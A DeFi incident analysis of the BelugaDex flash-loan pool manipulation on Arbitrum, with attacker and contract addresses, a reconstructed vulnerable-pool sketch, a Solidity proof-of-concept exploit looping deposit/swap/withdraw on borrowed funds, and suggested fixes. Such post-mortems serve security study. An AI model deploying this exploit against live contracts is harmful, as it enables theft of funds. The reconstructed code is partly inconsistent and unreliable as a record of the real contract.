# BelugaDex Flash Loan Pool Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | BelugaDex |
| Date | 2023-10-18 |
| Chain | Arbitrum |
| Loss | ~$175,000 USD |
| Attack Type | Flash Loan + Deposit/Swap/Withdraw Cycle |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x4843e00ef4c9f9f6e6ae8d7b0a787f1c60050b01` |
| Attack Contract | `0x9e8675365366559053f964be5838d5fca008722c` |
| Vulnerable Contract | `0x15a024061c151045ba483e9243291dee6ee5fd8a` (BelugaDex Pool) |
| Fork Block | 140,129,166 |

## 2. Vulnerable Code Analysis

BelugaDex's liquidity pool contained a pricing calculation error that occurred when `deposit()`, `swap()`, and `withdraw()` were executed cyclically within the same transaction. After obtaining large amounts of USDT/USDCe via flash loan, repeatedly executing the `deposit()` → `swap()` → `withdraw()` cycle produced a small profit on each iteration that accumulated over time.

```solidity
// Vulnerable pattern: pricing calculation error in deposit/swap/withdraw cycle
contract BelugaPool {
    uint256 public totalLiquidity;
    mapping(address => uint256) public userShares;

    // Vulnerable: swapping in the same block immediately after deposit applies a favorable ratio
    function deposit(address token, uint256 amount) external returns (uint256 shares) {
        // Shares calculated using current pool ratio at time of deposit
        shares = amount * totalShares / totalLiquidity;
        userShares[msg.sender] += shares;
        totalLiquidity += amount;
        IERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    // Vulnerable: liquidity calculation becomes distorted when swapping immediately after deposit
    function swap(address tokenIn, address tokenOut, uint256 amountIn) external returns (uint256 amountOut) {
        // Spot price-based calculation (ratio distorted after large deposit)
        amountOut = getAmountOut(tokenIn, tokenOut, amountIn);
        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        IERC20(tokenOut).transfer(msg.sender, amountOut);
    }

    function withdraw(uint256 shares) external returns (uint256 amount) {
        // Convert shares using current pool ratio
        amount = shares * totalLiquidity / totalShares;
        userShares[msg.sender] -= shares;
        totalLiquidity -= amount;
        // Actual ratio is distorted, allowing withdrawal of more tokens
    }
}
```

**Vulnerability**: Executing `swap()` immediately after a large `deposit()` causes a temporary discrepancy between the pool's actual liquidity ratio and the calculated ratio. A subsequent `withdraw()` then allows the attacker to recover more tokens at the inflated ratio. Repeating this cycle accumulates profit.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Deposit/Swap/Withdraw Cycle
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x4843e00ef4c9f9f6e6ae8d7b0a787f1c60050b01]
  │
  ├─1─▶ Balancer Vault.flashLoan()
  │      [Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      Borrow large amounts of USDT + USDCe
  │      [USDT: 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9]
  │      [USDCe: 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]
  │
  ├─2─▶ swapTokensSushi(USDT, ...)
  │      Additional token swap via SushiSwap
  │
  ├─3─▶ swapTokensSushi(USDCe, ...)
  │
  ├─4─▶ Repeated cycle (multiple times):
  │      a) Pool.deposit(USDT, amount)
  │         [USDT_LP: 0xCFf307451E52B7385A7538f4cF4A861C7a60192B]
  │      b) Pool.swap(USDT → USDCe)
  │      c) Pool.withdraw(shares)
  │         [USDC_LP: 0x7CC32EE9567b48182E5424a2A782b2aa6cD0B37b]
  │
  └─5─▶ USDT.transfer(), USDCe.transfer() - Repay flash loan
         ~$175,000 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external returns (uint256);
    function swap(address tokenFrom, address tokenTo, uint256 from, uint256 minimumTo, address to, uint256 deadline) external returns (uint256);
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData) external;
}

contract BelugaDexExploit {
    IPool pool = IPool(0x15a024061c151045ba483e9243291dee6ee5fd8a);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 USDCe = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 USDT_LP = IERC20(0xCFf307451E52B7385A7538f4cF4A861C7a60192B);
    IERC20 USDC_LP = IERC20(0x7CC32EE9567b48182E5424a2A782b2aa6cD0B37b);
    IPancakeRouter sushiRouter;

    function testExploit() external {
        address[] memory tokens = new address[](2);
        tokens[0] = address(USDT);
        tokens[1] = address(USDCe);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1_000_000e6;
        amounts[1] = 1_000_000e6;

        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        // Additional swaps via SushiSwap
        swapTokensSushi(address(USDT), address(USDCe), amounts[0] / 10);
        swapTokensSushi(address(USDCe), address(USDT), amounts[1] / 10);

        // Accumulate profit through repeated cycle
        for (uint i = 0; i < 10; i++) {
            uint256 usdtBalance = USDT.balanceOf(address(this));
            USDT.approve(address(pool), usdtBalance);

            // deposit
            uint256 lpAmount = pool.deposit(address(USDT), usdtBalance / 2, address(this), block.timestamp);

            // swap
            USDCe.approve(address(pool), USDCe.balanceOf(address(this)));
            pool.swap(address(USDCe), address(USDT), USDCe.balanceOf(address(this)), 0, address(this), block.timestamp);

            // withdraw
            USDT_LP.approve(address(pool), lpAmount);
            pool.withdraw(address(USDT), lpAmount, 0, address(this), block.timestamp);
        }

        // Repay flash loan
        USDT.transfer(address(balancer), amounts[0] + feeAmounts[0]);
        USDCe.transfer(address(balancer), amounts[1] + feeAmounts[1]);
    }

    function swapTokensSushi(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IERC20(tokenIn).approve(address(sushiRouter), amountIn);
        sushiRouter.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Deposit/Swap/Withdraw cycle pricing calculation error |
| Affected Scope | BelugaDex USDT-USDCe liquidity pool |
| Explorer | [Arbiscan](https://arbiscan.io/address/0x15a024061c151045ba483e9243291dee6ee5fd8a) |

## 6. Security Recommendations

```solidity
// Fix 1: Prohibit deposit and withdrawal within the same block
mapping(address => uint256) public lastDepositBlock;

function withdraw(uint256 shares) external {
    require(block.number > lastDepositBlock[msg.sender], "Cannot withdraw in deposit block");
    // ...
}

// Fix 2: Strengthen slippage protection
function withdraw(uint256 shares, uint256 minAmount) external {
    uint256 amount = shares * totalLiquidity / totalShares;
    require(amount >= minAmount, "Slippage too high");
    // ...
}

// Fix 3: Reentrancy guard + invariant check
modifier checkInvariant() {
    uint256 invariantBefore = calculateInvariant();
    _;
    uint256 invariantAfter = calculateInvariant();
    // Revert if invariant decreases
    require(invariantAfter >= invariantBefore * 999 / 1000, "Invariant violated");
}

function swap(...) external nonReentrant checkInvariant { ... }
```

## 7. Lessons Learned

1. **Deposit/Swap/Withdraw cycle vulnerability**: When deposit, swap, and withdraw are executed cyclically within the same transaction in an AMM pool, it must be rigorously verified that the internal pricing invariant is maintained throughout.
2. **Arbitrum DeFi security**: Arbitrum's low gas fees make repeated cycle attacks (10+ iterations) economically viable. L2 protocols must account for a greater risk of iterative attacks compared to L1.
3. **Balancer flash loan abuse**: Balancer Vault provides multiple tokens simultaneously via flash loan. Arbitrum protocols must defend against simultaneous manipulation through multi-token flash loans.
4. **Liquidity pool invariant checks**: All liquidity pool operations (deposit, swap, withdraw) must verify within the transaction that the pool's invariant (xy=k or StableSwap invariant) is preserved.